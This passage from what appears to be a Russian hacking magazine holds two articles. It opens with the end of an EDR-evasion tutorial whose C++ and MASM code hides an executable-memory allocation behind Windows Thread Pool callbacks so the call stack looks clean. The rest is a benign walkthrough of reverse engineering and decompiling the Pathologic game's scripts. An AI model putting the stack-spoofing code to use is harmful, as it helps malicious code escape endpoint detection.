го с помощью TpAllocWork. Если задание находится в очереди или выпол‐
няется, вызов TpReleaseWork дождется завершения задания, а затем осво‐
бодит ресурсы.


void TpReleaseWork(
    PTP_WORK Work
);

Как и в предыдущей функции, здесь всего один аргумент — PTP_WORK Work.
   Вызов API с применением этих функций будет формироваться таким обра‐
зом:


typedef NTSTATUS(NTAPI* ALLOCWORK)(PTP_WORK* ptpWork,
PTP_WORK_CALLBACK ptpCallback, PVOID arg, PTP_CALLBACK_ENVIRON
CallbackEnv);
typedef VOID(NTAPI* POSTWORK)(PTP_WORK);
typedef VOID(NTAPI* RELEASEWORK)(PTP_WORK);


...


VOID MakeCall(PTP_WORK_CALLBACK work_callback, PVOID args) {
    PTP_WORK ptpWork = NULL;


    ((TPALLOCWORK)ptr_TpAllocWork)(&ptpWork, (PTP_WORK_CALLBACK)
work_callback, args, NULL);
    ((TPPOSTWORK)ptr_TpPostWork)(ptpWork);
    ((TPRELEASEWORK)ptr_TpReleaseWork)(ptpWork);


    WaitForSingleObject((HANDLE)-1, 0x1000);
}

Здесь PTP_WORK_CALLBACK work_callback — указатель на ассемблерную
вставку, которая и сделает сам вызов NTAPI, а PVOID args — это пакет аргу‐
ментов вызываемой функции.
   Пакет аргументов формируется в виде обычной структуры, содержащей
параметры функции. Небольшое исключение — первым аргументом в струк‐
туре будет указатель на NtAllocateVirtualMemory. На нашем примере
это происходит таким образом:


// Структура аргументов
typedef struct _ZWALLOCATEVIRTUALMEMORY_ARG {
    // Первый аргумент структуры — указатель на функцию
NtAllocateVirtualMemory
    UINT_PTR    pNtAllocateVirtualMemory;
    HANDLE      ProcessHandle;
    PVOID*      BaseAddress;
    ULONG_PTR   ZeroBits;
    PSIZE_T     RegionSize;
    ULONG       AllocationType;
    ULONG       Protect;
} ZWALLOCATEVIRTUALMEMORY_ARG, * PZWALLOCATEVIRTUALMEMORY_ARG;


...


PVOID NtAllocateVirtualMemory(HANDLE hProcess) {
    PVOID alloc_addr = NULL;
    SIZE_T alloc_size = 0x1000;


    ZWALLOCATEVIRTUALMEMORY_ARG AllocateVirtualMemory_Arg = { 0 };
        // Здесь получили указатель на NtAllocateVirtualMemory
    AllocateVirtualMemory_Arg.pNtAllocateVirtualMemory = (UINT_PTR)
GetProcAddress(GetModuleHandleA("ntdll"), "NtAllocateVirtualMemory");
    AllocateVirtualMemory_Arg.ProcessHandle = hProcess;
    AllocateVirtualMemory_Arg.BaseAddress = &alloc_addr;
    AllocateVirtualMemory_Arg.ZeroBits = 0;
    AllocateVirtualMemory_Arg.RegionSize = &alloc_size;
    AllocateVirtualMemory_Arg.AllocationType = MEM_RESERVE;
    AllocateVirtualMemory_Arg.Protect = PAGE_EXECUTE_READWRITE;


    MakeCall((PTP_WORK_CALLBACK)NtAllocateVirtualMemoryCallback, &
AllocateVirtualMemory_Arg);


    return alloc_addr;
}

Сам work_callback написан на MASM, и его задача — разбирать аргументы,
формировать стек для NtAllocateVirtualMemory и делать сам вызов фун‐
кции. В x64 аргументы в функцию передаются так: первые четыре аргумента
через регистры rcx, rdx, r8, r9, а если аргументов больше, то следующие
передаются через стек с применением регистра rsp.


NtAllocateVirtualMemoryCallback proc
    mov rbx, rdx
    ; Возьмем адрес NTAPI из структуры
    mov rax, [rbx]
    ; Получим все оставшиеся ее аргументы
    mov rcx, [rbx + 8]
    mov rdx, [rbx + 10h]
    xor r8, r8
    mov r9, [rbx + 18h]
    mov r10, [rbx + 20h]
    mov [rsp + 30h], r10
    mov r10, 1000h
    mov [rsp + 28h], r10
    ; Сам вызов NtAllocateVirtualMemory
NtAllocateVirtualMemoryCallback endp
    jmp rax

Не забываем, что из кода на C++ функцию ассемблера можно вызвать, объ‐
явив ее при помощи extern в одном из заголовков.


extern "C" VOID CALLBACK NtAllocateVirtualMemoryCallback(
PTP_CALLBACK_INSTANCE Instance, PVOID Context, PTP_WORK Work);

После  этого  можно  просто  вызвать NtAllocateVirtualMemory(HANDLE
hProcess), и стек будет выглядеть полностью чистым, потому что вызов фун‐
кции возьмет на себя сам механизм Windows Thread Pools.





                       Ничто в стеке не указывает на нас


ВЫВОДЫ

Сегодня ты узнал, что такое раскрутка стека, как она помогает обнаруживать
выполнение злонамеренного кода и как можно этот механизм обнаружения
запутать. Что примечательно, в этом случае сама Windows помогла нам спра‐
виться с обнаружением. Можно ли этот метод считать серебряной пулей?
Конечно, нет! Как только EDR станут следить за колбэками в интересующих ее
функциях, эта тайна раскроется. Но, как и всегда, борьба щита и меча про‐
должается!
ВЗЛОМ





Много  лет  назад  я  пытался  узнать,
как работает игра «Мор (Утопия)» на самом
деле. Но тогда формат ее скриптов оказал‐
ся мне не по зубам. Сегодня мы вскроем
движок игры, чтобы узнать, как работают              mr.grogrig                                                                                            mr.grogrig@gmail.com
скрипты. И даже напишем  собственный
декомпилятор  для   неизвестного  языка
программирования!


             INFO

                            Если тебе тоже  интересно создание модифи‐
                       каций для «Мора» — предлагаю объединить наши
                            усилия. Добавляйся в чат по реверсу игры!



СБОР ИНФОРМАЦИИ

Скрипты хранятся в файле Scripts.vfs. Формат самодельный и простей‐
ший, можешь почитать, как их вскрывают, в одной из моих старых статей, где
я показывал, как вскрыть и изменить ресурсы «Ядерного титбита». Я решил
не тратить на это время и распаковал архив готовым софтом VFS Explorer.
   Внутри лежит куча бинарных файлов с расширением .bin. Первые четыре
байта не содержат никакой заметной сигнатуры.
   Обычно разработчики встраивают проверенные скриптовые языки вроде
Lua или Python. Раз файл бинарный, значит, скрипт был скомпилирован.
Однако по разреженному (полному нулей) байт‑коду стало ясно, что формат
скриптов проприетарный. Только самодельные языки так расточительно
используют пространство файла — сравни с оптимизированными процес‐
сорными опкодами. Нули в байт‑коде могут означать, что команда занимает
фиксированное количество байтов, а аргументов к ней не завезли.
   Первым делом я пошел гуглить моды и наткнулся на частичный разбор
формата файла. Он помог на первоначальном этапе, но ближе к середине
списка заголовков документ обрывается, не оставляя никаких ссылок на про‐
должение. Так что пришлось взять в руки старый добрый отладчик и выяснить
все самостоятельно.
   Этого исследования не было бы, если бы недавно не была опубликована
альфа‑версия игры. Примечательна она тем, что исполняемые файлы пос‐
тавляются вместе с файлами .pdb, которые содержат прототипы функций,
а также все используемые структуры. Именно отладочные символы поз‐
волили сократить время исследования с нескольких месяцев до пары недель.


ИЩЕМ ТОЧКУ ВХОДА

Чтобы узнать, какие поля есть в закрытом формате на самом деле, поищем
место в коде игры, где читаются скрипты. Для этого запустим игру в x64dbg,
современной  альтернативе OllyDbg. Отладчик  автоматически  подгружает
с диска символы, расставляя адресам в памяти оригинальные названия.
  Но сначала отключим полноэкранный режим, для этого изменим config.
ini:


[Video]
XRes = 1024
YRes = 768
Fullscreen = 0

Теперь с игрой можно работать в отладчике, не опасаясь зависаний. Пос‐
мотрим, какие файлы вообще открываются игрой. Для этого используем ус‐
ловные точки останова. Переходим на WinAPI-функцию CreateFileA и соз‐
даем такой бряк:


Текст журнала: OPEN: {ansi@[ESP+4]}
Условие остановки = 0
Условие добавления в журнал = 1

В текст журнала можно вставлять форматирование вместе с обрабаты‐
вающими функциями. В данном случае мы просим отладчик добавлять в жур‐
нал запись о каждом открытом файле, получая путь к файлу через стек, то
есть,  по  сути,  просто берем  строку  из  первого  аргумента  функции
CreateFileA.
   Запускаем игру и видим в журнале полотно из игровых ассетов:


OPEN: C:\games\pathologic\alpha\data\scripts\fire.bin

Вот это уже интересно. Скрипты запакованы в архиве, но в целях отладки
или патчинга игра сначала пытается прочитать их с диска. И только если там
их нет, читает содержимое файлов из игрового архива. Это значительно
облегчает создание модов.
   Допустим, я хочу остановить отладчик на конкретном файле. Для этого
слегка изменим точку останова:


Условие остановки = strstr(ansi([ESP+4]), "fire.bin")

Функция strstr возвращает единицу, если в строке, которую вернет ansi,
будет подстрока fire.bin. Перезапустив отладчик, ловим остановку на нуж‐
ном файле. Смотрим в стеке адрес, откуда пришел вызов:


возврат к engine.CScriptManager::RunScript+88 из ???

Похоже на точку запуска скрипта! Самое время открыть Engine.dll в IDA Pro.


ИССЛЕДУЕМ ЗАГОЛОВКИ

IDA показывает не так много входящих ссылок на CreateFileA, быстро
находим фрагмент кода внутри RunScript, читающий файл скрипта через
виртуальную файловую систему (VFS).


v8 = __v.second.m_pManager->m_pFS->CreateMappedLoadObject(__v.second.
m_pManager->m_pFS, pszScriptName);
// (...)
ScriptDataPtr = Script_2->GetMemoryPointer(Script_2);
CScript::CScript(ScriptDataPtr, __v.second.__vftable, v43)

Тело скрипта передается в конструктор объекта CScript. IDA весьма огра‐
ниченно умеет работать с программами, написанными на C++, поэтому
CScript::CScript — это просто имя функции, никак не связанное с классом
в целом. Многие классы имеют таблицу виртуальных функций, по которой
можно восстановить их принадлежность, даже если у нас под рукой нет сим‐
волов.


void __userpurge CScript::CScript(CScript *this@<ecx>, CScript *
pScript, unsigned int ulSize);

Согласно прототипу функции, первый аргумент — это файл скрипта и он же
является телом класса. Такое решение часто встречается в старых играх. Они
экономили на сериализации и просто дампили тела классов на диск, нап‐
ример  для  создания  сохранений.  Посмотрим  на  определение  класса
CScript:


struct __cppobj __unaligned __declspec(align(4)) CScript
{
    unsigned int m_ulGlobalVarCount;
    boost::scoped_array<unsigned char> m_pGlobalVarTypes;


    _STL::map<CEString,unsigned long,_STL::less<CEString>,_STL::
allocator<_STL::pair<CEString const ,unsigned long> > > m_Properties;


    unsigned int m_ulDataPoolSize;
    boost::scoped_array<char> m_pDataPool;
    unsigned int m_ulGlobalCount;
    boost::scoped_array<CScript::GLOBAL_FUNCTION> m_pGlobals;


    unsigned int m_ulTaskCount;
    boost::scoped_array<CScript::TASK> m_pTasks;


    _STL::map<unsigned long,CScript::EVENT,_STL::less<unsigned long>,
_STL::allocator<_STL::pair<unsigned long const ,CScript::EVENT> > >
m_GlobalEvents;


    unsigned int m_ulCodeSize;
    boost::scoped_array<boost::scoped_ptr<IInstruction> > m_pCode;
    unsigned int m_ulRunTask;
    unsigned int m_ulRunOp;


    _STL::set<IScriptNotify *,_STL::less<IScriptNotify *>,_STL::
allocator<IScriptNotify *> > m_Notify[3];
};

Структура прочитана из PDB-файла. IDA не умеет нормально работать с шаб‐
лонами, поэтому эти страшные длинные строчки с кучей запятых и угловых
скобок — не более чем названия сишных структур. В глаза бросается схо‐
жесть тела класса со структурой скрипта, описанной на фанатском сайте.
С ней можно работать.
   Первые четыре байта — это поле m_ulGlobalVarCount, дальше массив
байтов m_pGlobalVarTypes. Далее идет массив типа boost::scoped_array.
Следом за ним — словарь std::map. Из определений не очевидно, какими
байтами они представлены в теле класса. Проще всего срисовать в отладчи‐
ке значения каждого поля для любого известного файла. Так или иначе,
в дампе класса все эти поля должны сводиться к простым сишным типам.





Для этого включаем в IDA адресацию относительно начала функции, а затем
синхронизацию между окнами с ассемблером и псевдокодом. Теперь мы
можем найти указанный адрес в любом запущенном отладчике, вбив строку
CScript::CScript  +  E3. И  подсмотреть  реальные  значения  полей
в динамике.


qmemcpy(task->m_pVarTypes.ptr, var_count_ptr + 1, task->m_ulVarCount)
;

Хорошо помогают вызовы функций типа qmemcpy, исходные данные лежат
в регистре ESI, а количество копируемых байтов — в ECX. По ним можно
понять, где в файле предполагается длинная строка, а не поле типа int.
   Некоторые поля  (например, m_ulGlobalVarCount) бывают  нулевыми,
а значит, следом за ними не идет интересующая нас структура. Отлавливаю
работу с файлами, у которых есть эта структура, посредством условных точек
останова вроде EAX != 0.





Таким нехитрым образом я восстановил заголовки файла в 010 Editor. Про‐
цесс несложный: делаем предположение, отражаем его в шаблоне, проверя‐
ем значения в отладчике. Повторяем, пока картинка не сложится. Готовый
шаблон слишком велик для цитирования, ищи его в моем репозитории
на GitHub. Вот его упрощенная версия:


struct VarTypes
{
    VAR_TYPE type;
    BYTE flag;
    BYTE len;
    CHAR str[len];
};


struct GLOBAL_FUNCTION
{
    BYTE Len;
    CHAR Name[Len];
    DWORD ArgCount;
};


struct EVENT
{
    DWORD ulEventID;
    DWORD m_ulOp;
    DWORD m_ulVarCount;
    CHAR m_pVarTypes[m_ulVarCount];
};


struct TASK
{
    DWORD m_ulVarCount;
    BYTE m_pVarTypes[m_ulVarCount];
    DWORD m_ulParmCount;
    DWORD event_count;
    EVENT m_Events[event_count];
};


struct EventId
{
    DWORD event_id;
    DWORD m_ulOp;
    DWORD m_ulVarCount;
    BYTE m_pVarTypes[m_ulVarCount];
};


struct Headers
{
    DWORD m_ulGlobalVarCount;
    VarTypes gvar_types[m_ulGlobalVarCount];


    DWORD m_ulDataPoolSize;
    BYTE m_pDataPool[m_ulDataPoolSize];


    DWORD m_ulGlobalCount;
    GLOBAL_FUNCTION m_pGlobals[m_ulGlobalCount];


    DWORD m_ulRunTask;
    DWORD m_ulRunOp;


    DWORD m_ulTaskCount;
    TASK m_pTasks[m_ulTaskCount];


    DWORD event_count;
    EventId Events[event_count];


    DWORD m_ulCodeSize;
    BYTE code[m_ulCodeSize];
};

Файл начинается с определения глобальных переменных. Дальше идет «бас‐
сейн», состоящий из строчек в формате Unicode. За ним следуют определе‐
ния используемых функций, фактически это секция импорта. Поле m_ulRunOp
говорит, с какой команды запускать скрипт. Задания и события служат той же
цели. Заголовки заканчиваются массивом команд — ради них мы и раз‐
бирали формат файла!


                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ
      МОД (УТОПИЯ)
             РАЗБИРАЕМ ПО ВИНТИКАМ
               ВИРТУАЛЬНУЮ МАШИНУ
                          PATHOLOGIC





ИССЛЕДУЕМ БАЙТ-КОД

Я решил рассмотреть и другие методы класса CScript и наткнулся на такую
функцию:


void __usercall CScript::CreateInstruction(unsigned int ulType@<edi>,
CStringReader *reader@<ecx>, CScript *pScript);

Поставив на нее брейк‑пойнт, я выяснил, что аргумент ulType принимает
номер опкода, а объект reader ссылается на текущее положение в прочитан‐
ном файле fire.bin. Чтобы выяснить, где номера, а где аргументы, я решил
собрать номера при помощи условной точки останова:


Текст журнала: ulType: {EDI}
Условие добавления в журнал: 1

Получаем в журнале список:


ulType: 1A
ulType: 4E
ulType: 51
ulType: 1A
ulType: 4E
ulType: 17
ulType: 17
ulType: 4D

Находим номера в теле файла.


00F0  00 51 00 00 00 00 00 1A 00 00 00 00 00 4E 00 00  .Q...........
N..
0100  00 00 00 51 00 01 00 00 00 1A 00 00 00 00 00 4E  ...Q..........
.N
0110  00 00 00 00 00 17 00 02 00 00 00 05 05 17 00
01  ................
0120  00 00 00 01 4D 00 2C 00 00 00 1A 00 00 00 00 00  ....
M.,.........

Сначала идет номер опкода, затем аргументы переменной длины. Значит,
придется составить карту, исследовав каждый номер по отдельности.


void __usercall CScript::CreateInstruction(unsigned int ulType@<edi>,
CStringReader *reader@<ecx>, CScript *pScript)
{
  // (...)
  switch ( ulType )
  {
    case 0u:
      v4 = operator new(0xCu);
      if ( !v4 )
        goto LABEL_4;
      CInstructionMov::CInstructionMov(v4, reader);
      return result;
    case 1u:
      v6 = operator new(0xCu);
      if ( !v6 )
        goto LABEL_4;
      CInstructionMovB::CInstructionMovB(v6, reader);
      return result;
    case 2u:
      v7 = operator new(0xCu);
      if ( !v7 )
        goto LABEL_4;
      CInstructionMovI::CInstructionMovI(v7, reader);
      return result;
  // (...)
  }
}

Внутри функции CreateInstruction огромный switch с обработчиками
для каждого номера. Первоначальная задача — написать дизассемблер
длин. Нам не так важно, как работает опкод, но важно выяснить, сколько он
занимает места в файле. Тогда мы сможем правильно прочесть все осталь‐
ные.


void __usercall CInstructionMov::CInstructionMov(CInstructionMov *
this@<eax>, CStringReader *reader@<edx>)
{
  const char *m_pszDataCur; // ecx


  this->__vftable = &CInstructionMov::vftable;
  m_pszDataCur = reader->m_pszDataCur;
  this->m_ulVarIn = *m_pszDataCur;
  m_pszDataCur += 4;
  reader->m_pszDataCur = m_pszDataCur;
  this->m_ulVarOut = *m_pszDataCur;
  reader->m_pszDataCur = m_pszDataCur + 4;
}

Итак, сколько он занимает места? В качестве подсказки можно использовать
тело класса:


struct __cppobj CInstructionMov : IInstruction
{
  unsigned int m_ulVarIn;
  unsigned int m_ulVarOut;
};

Наследование интерфейса IInstruction гарантирует, что первые четыре
байта — ссылка на vftable. Дальше два поля: m_ulVarIn и m_ulVarOut. Пос‐
мотрев на код, убеждаемся, что курсор объекта reader два раза смещают
на четыре байта, ровно под два поля из тела класса. Значит, читается восемь
байт. Создаем такую же структуру в нашем шаблоне:


struct CInstructionMov
{
    DWORD VarIn;
    DWORD ulVarOut;
};

В CreateInstruction обрабатывается 87 опкодов, и несколько литров кофе
спустя я разобрал их все. Оставалось только сравнить номера опкодов
в шаблоне и список из перехваченных номеров в отладчике. Через какое‑то
время я отловил ошибки, и шаблон стал работать со всеми скриптами.
   Разобрать код без ошибок — полдела. Следующий шаг — понять, что он
делает.


ПИШЕМ ДЕКОМПИЛЯТОР

У меня уже есть список опкодов, из названий которых примерно понятно, что
они делают. Но в идеале нужно получить читаемый псевдокод, из которого
будет ясно, что делает весь скрипт. По логике объектно ориентированного
программирования  объект  опкода  должен  содержать  код  исполнения,
который вызывается при запуске скрипта. И действительно, поискав по име‐
ни, находим метод Execute у класса с тем же именем:


bool __thiscall CInstructionMov::Execute(CInstructionMov *this,
CScriptRun::Data *data, float fDeltaTime)
{
  _BYTE pExceptionObject[12]; // [esp+8h] [ebp-Ch] BYREF


  if ( !(*data->m_Stack._M_finish[-this->m_ulVarOut].m_Object->vSet)(
          data->m_Stack._M_finish[-this->m_ulVarOut].m_Object,
          data->m_Stack._M_finish[-this->m_ulVarIn].m_Object) )
  {
    CScriptRun::Error::Error("Can't convert variable");
    _CxxThrowException(pExceptionObject, &_TI1_AVError_CScriptRun__);
  }
  ++data->m_ulCurOp;
  return 0;
}

Видим, что код увеличивает глобальный счетчик команд m_ulCurOp — мес‐
тный аналог регистра EIP.


struct IVariableEx_vtbl
{
  void (__thiscall *~IBase)(IBase *this);
  bool (__thiscall *Release)(IGeneric *this);
  IGeneric *(__thiscall *QueryInterface)(IGeneric *this, unsigned int
);
  VAR_TYPE (__thiscall *GetVariableType)(IVariable *this);
  _BYTE vSet[24];
  bool (__thiscall *Set)(IVariable *this, bool);
  _BYTE vGet[24];
  bool (__thiscall *Get)(IVariable *this, bool *);
  // (...)
};

По логике должен вызываться метод Set, но в реальности «вызываются» бай‐
ты по адресу, который я назвал vSet. Дело в том, что IVariableEx —
интерфейс, конкретная реализация которого зависит от типа переменной.
24 байта оставлено под шесть ссылок для шести разных типов переменных.
Общий интерфейс оставляет место под конкретную ссылку, но не знает ее
точного расположения. Так что можно считать, что это вызов метода Set.
Через него код передает значение переменной m_ulVarIn в переменную
m_ulVarOut. Это можно записать примерно такой строчкой псевдокода:


Stack[-VarOut] = Stack[-VarIn]

Объект m_Stack представляет собой std::vector — безразмерный массив
из  стандартной  библиотеки C++. На нем реализован стек  виртуальной
машины самодельного скриптового языка. Стек работает по принципу LIFO
(Last In, First Out), то есть добавляет последний элемент в конец списка и дос‐
тает следующий элемент из конца. Поэтому код использует номера со знаком
минус, это отрицательный индекс от конца списка.
  Я решил  написать  декомпилятор  на  Python, он  отлично  подходит
для написания бинарных парсеров. Для начала мне понадобился свой класс
reader, чтобы удобно читать поток байтов:


class Reader:


    def __init__(self, path):
        self.f = open(path, "rb")


    def __del__(self):
        self.f.close()


    def read(self, size, format):
        return struct.unpack(format, self.f.read(size))[0]


    def uint32(self):
        return self.read(4, 'I')


    def uint16(self):
        return self.read(2, 'H')


    def uint8(self):
        return self.read(1, 'B')


    def bytes(self, size):
        return self.f.read(size)


    def str_a(self, size):
        return self.f.read(size).decode('utf-8')


    def float(self):
        return round(struct.unpack('f', self.f.read(4))[0], 5)

С его помощью добавление нового опкода становится максимально прос‐
тым, а код — легко читаемым:


class CInstructionMov:
    def __init__(self, r):
        self.OpCode = 'Mov'
        self.VarIn = r.uint32()
        self.VarOut = r.uint32()


    def __repr__(self):
        return f'Stack[-{self.VarOut}] = Stack[-{self.VarIn}]'

Из созданного «Идой» кода не всегда понятно, что делает сложная команда.
Проще всего посмотреть на состояние стека (в котором лежат все перемен‐
ные) до и после выполнения команды. Для этого нужно написать очередной
скрипт для отладчика, но в этот раз для IDA Pro.
   Когда  мы   проваливаемся   внутрь   любой    инструкции   вроде
CInstructionMov,  вторым  аргументом  передается  CScriptRun::Data
*data — ссылка на структуру с глобальными переменными. Ее мы и будем
считывать:


struct __cppobj CScriptRun::Data
{
  CScript *m_pScript;
  CScriptRun *m_pScriptRun;
  IScriptContext *m_pContext;
  CScriptRun::GF_RESOLVED *m_pResolved;
  boost::scoped_array m_pGlobalVars;
  _STL::vector m_Tasks;
  _STL::vector m_Stack;
  unsigned int m_ulCurOp;
  CSerPtr m_pOpData;
};

IDAPython позволяет читать значения регистров и памяти прямо во время
отладки:


def dump_vm_state():
    data_ptr = get_reg_value('esp') + 4
    data_adr = read_dbg_dword(data_ptr)
    stack_ptr = data_adr + 0x20
    cur_op = read_dbg_dword(data_adr + 0x2c)


    print(f'CurOP: {hex(cur_op)}')
    print(f'Stack: ')
    dump_vector(stack_ptr)

Я беру ссылку из стека и раскручиваю ее до нужных структур по заранее
известным смещениям:


def dump_vector(addr):
    m_start = idc.read_dbg_dword(addr)
    m_finish = idc.read_dbg_dword(addr+4)


    while m_start < m_finish:
        m_obj = idc.read_dbg_dword(m_start)
        vftable = idc.read_dbg_dword(m_obj)
        class_name = idc.get_name(vftable)
        demangle_type = idc.get_inf_attr(INF_SHORT_DN)
        class_name = idc.demangle_name(class_name, demangle_type)
        class_name = RE_VAR_TYPE.findall(class_name)[0]


        value = ''


        if class_name == 'CVariableInt':
            value = idc.read_dbg_dword(m_obj+8)


        if class_name == 'CVariableFloat':
            value = idc.read_dbg_dword(m_obj+8)


        if class_name == 'CVariableString':
            vector = idc.read_dbg_dword(m_obj+8)
            str_data = read_dbg_memory(vector, 100)
            value = '"' + get_str_from_addr(str_data) + '"'


        if class_name == 'CVariableBool':
            value = idc.read_dbg_byte(m_obj+8)


        if class_name == 'CVariableVector':
            x = idc.read_dbg_dword(m_obj+8)
            y = idc.read_dbg_dword(m_obj+8+4)
            z = idc.read_dbg_dword(m_obj+8+4+4)
            value = f'({x},{y},{z})'


        print(hex(m_start), hex(m_obj), class_name, value)
        m_start +=4

Здесь используется интересный трюк. Стек содержит ссылки на объекты —
производные классы от CVariableBase. Первые четыре байта тела любого
объекта — ссылка на vftable. По ее адресу можно получить имя класса, пре‐
доставляемое отладочными символами. А зная класс переменной, нетрудно
прочесть ее значения:



  Python>dump_vm_state()
  CurOP: 0x1015
  Stack:
  0x3dcd1f8 0x3dcda38 CVariableFloat 0
  0x3dcd1fc 0x3dcda60 CVariableFloat 1086324736
  0x3dcd200 0x3dcda88 CVariableString "dawn_bk.tex"
  0x3dcd204 0x3dcdab8 CVariableString "dawn_ft.tex"
  0x3dcd208 0x3dcdae8 CVariableString "dawn_lt.tex"
  0x3dcd20c 0x3dcdb18 CVariableString "dawn_rt.tex"
  0x3dcd210 0x3dcdb48 CVariableString "dawn_up.tex"
  0x3dcd214 0x3dcdb78 CVariableString "dawn_rain_bk.tex"
  0x3dcd218 0x3dcdba8 CVariableString "dawn_rain_ft.tex"
  0x3dcd21c 0x3dcdd50 CVariableString "dawn_rain_lt.tex"
  0x3dcd220 0x3dcdd80 CVariableString "dawn_rain_rt.tex"
  0x3dcd224 0x3dcddb0 CVariableString "dawn_rain_up.tex"
  0x3dcd228 0x3dcdde0 CVariableBool 3131961344
  0x3dcd22c 0x3dcde08 CVariableVector (1053345994,1048872069,1048872069)
  0x3dcd230 0x3dcde38 CVariableVector (1053345994,1048872069,1048872069)
  0x3dcd234 0x3dcde68 CVariableFloat 1161527296
  0x3dcd238 0x3dcde90 CVariableFloat 1167867904
  0x3dcd23c 0x3dcdeb8 CVariableVector (1061734602,1057326470,1055056611)
  0x3dcd240 0x3dcdee8 CVariableVector (1061734602,1057326470,1055056611)
  0x3dcd244 0x3dcdf18 CVariableFloat 0
  0x3dcd248 0x3dcdf40 CVariableFloat 1090519040
  0x3dcd24c 0x3dcdf68 CVariableFloat 1086324736


Дампинг значений до и после исполнения интересующей меня инструкции
помог разобрать опкоды, не копаясь в тонне декомпилированного с ошиб‐
ками кода C++. Только если команда вела себя неожиданным образом, при‐
ходилось заглядывать в декомпилятор, но большинство инструкций разоб‐
ралось и так.
   Дело  за малым —  разобрать  аналогичным  образом  код  осталь‐
ных 86 опкодов. Примерно неделю спустя я получил рабочий декомпилятор.
Статья превратится в книгу, если я буду описывать каждый опкод отдельно.
Поэтому читай полный код декомпилятора на GitHub.


                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ
      МОД (УТОПИЯ)
             РАЗБИРАЕМ ПО ВИНТИКАМ
               ВИРТУАЛЬНУЮ МАШИНУ
                          PATHOLOGIC





МИГРАЦИЯ С АЛЬФА-ВЕРСИИ

Альфа‑версия хранит в архиве 343 скрипта, датированных июлем 2004 года.
Официальное издание «Мора» содержит уже 978 штук, с разными датами
вплоть до октября 2005-го.
   Меня интересуют скрипты полной версии, но при попытке открыть их шаб‐
лоном  010  Editor  от  альфа‑версии  вылезает  ошибка  шаблонизатора.
Заголовки разбираются нормально, значит, их формат не изменился, а вот
список опкодов ломает исполнение шаблона. Выясним, в чем дело, сравнив
оба движка.
  Для этого понадобится плагин к IDA Pro — Diaphora. Он создан для срав‐
нения двух версий одного и того же файла. Так называемый патч‑диффинг
помогает найти место, исправленное патчем безопасности, и написать экс‐
плоит для старой версии. Тот же метод поможет определить расположение
известных функций, чтобы понять, что изменилось в новой версии движка.
   IDA славится обратной совместимостью со своими же старыми версиями,
поэтому в конце работы плагин падает с ошибкой.



  [Diaphora: Wed Apr  2 19:57:08 2025] Error: module 'idc' has no
  attribute 'get_ordinal_qty'
  Traceback (most recent call last):
  File "C:\Program Files\IDA Professional 9.0\diaphora\3.2.1\diaphora_ida.
  py", line 1281, in export
  self.do_export(crashed_before)
  File "C:\Program Files\IDA Professional 9.0\diaphora\3.2.1\diaphora_ida.
  py", line 1248, in do_export
  self.export_structures()
  File "C:\Program Files\IDA Professional 9.0\diaphora\3.2.1\diaphora_ida.
  py", line 3329, in export_structures
  local_types = idc.get_ordinal_qty()
  File "C:\Program Files\IDA Professional 9.0 SP1\python\ida_ida.py", line
  4612, in __getattribute__
  return getattr(self.orig, name)
  AttributeError: module 'idc' has no attribute


Замечательно,   лезу   в   исходники   файла  C:\Program   Files\IDA
Professional 9.0 SP1\python\idc.py, так как помню, что функция должна
быть там, и закономерно там ее не нахожу. Смотрю код старой версии:


def get_ordinal_qty():
    """
    Get number of local types + 1


    @return: value >= 1. 1 means that there are no local types.
    """
    return ida_typeinf.get_ordinal_qty(None)

Разработчики «Иды» любят менять имена функций, оставляя к ним старые
комментарии. Поискав по тексту копию комментария, находим новое имя:


def get_ordinal_limit():
    """
    Get number of local types + 1


    @return: value >= 1. 1 means that there are no local types.
    """
    return ida_typeinf.get_ordinal_limit(None)

Меняю код Diaphora и перезапускаю плагин. В этот раз все прошло успешно.
Плагин создает базу SQLite для обоих файлов и затем сравнивает ее в поис‐
ках одинаковых функций. На выходе получаем несколько новых окон со спис‐
ком похожих функций. Делаем снимок базы и жмем Import all functions.





                      Diaphora закончила сравнение

Теперь у меня есть практически полностью размеченная база для новой вер‐
сии движка. Остается найти изменения в коде функции CreateInstruction.
Поочередно сравниваю все инструкции, пока не натыкаюсь на первые раз‐
личия:


case 0x4C:
  v73 = operator new(0x14u);
  if ( v73 )
    CInstructionPow2::CInstructionPow2(v73, a1);
  return;
case 0x4D:
  v76 = operator new(0xCu);
  if ( v76 )
    CInstructionCall::vftable(v76, a1);
  return;
case 0x4E:
  if ( operator new(0x10u) )
    NEW_OCPODE_1(a1);
  return;
case 0x4F:
  v19 = operator new(8u);
  if ( !v19 )
    return;
  *v19 = &NEW_COMMAND_2_vtable;
  break;

Ближе к концу списка вставлено два новых опкода! Первый занимает девять
байт и не делает ничего полезного. А вот второй передает управление и фак‐
тически повторяет код CInstructionCall, поэтому в декомпиляторе я назвал
его Call2. Остальные опкоды работают так же, как раньше.


ИССЛЕДУЕМ СУЩЕСТВУЮЩИЕ СКРИПТЫ

Декомпилятор написан и работает. Местами декомпиляция не очень точная,
но мы уже можем понять, что делает тот или иной скрипт. Чтобы опкоды
не сливались в единую стену текста, я решил разделять их на типичные
базовые блоки — ставить разрыв строки после команд передачи управления.


bed.bin
Скрипт отвечает за поведение кроватей в игре.


Import:
    SetVisibility (1 args)
    Hold (0 args)
    IsOverrideActive (1 args)
    ActivateSleepMode (1 args)


RunOp = 0x0
RunTask = 0


GlobalTasks:
    GTASK_0  Params = 0
        EVENT_0 Op = 0x7 Vars = (object)


0x0: Push((bool) 1)
0x1: @ SetVisibility(Stack[-1])
0x2: Pop(1)
0x3: @ Hold()
0x4: Pop(0)
0x5: GOTO 0x3


0x6: Return(0)


0x7: PushEmpty(bool, bool)
0x8: @ IsOverrideActive(Stack[-1])
0x9: Pop(0)
0xa: Stack[-1] = !Stack[-1]
0xb: IF (Stack[-1] == 0) GOTO 0xe; Pop(1)


0xc: @ ActivateSleepMode(Stack[-3])
0xd: Pop(0)
0xe: Return(2)

При создании объекта, то есть появлении игрока в непосредственной бли‐
зости, запускается код по адресу RunOp. Адреса представляют собой поряд‐
ковый номер опкода, примерно как номер строки в бейсике. Первый, то есть
нулевой, опкод заталкивает в стек значение 1. Второй вызывает функцию
SetVisibility с единственным аргументом, который берется из вершины
стека. Дальше следует бесконечный цикл из вызова функции Hold.
   Заголовок GlobalTasks содержит адреса событий — что‑то вроде кол‐
бэков, вызов которых происходит в ответ на какие‑то события в игре. Нас‐
колько я понимаю, единственное «событие» в жизни объекта «кровать» —
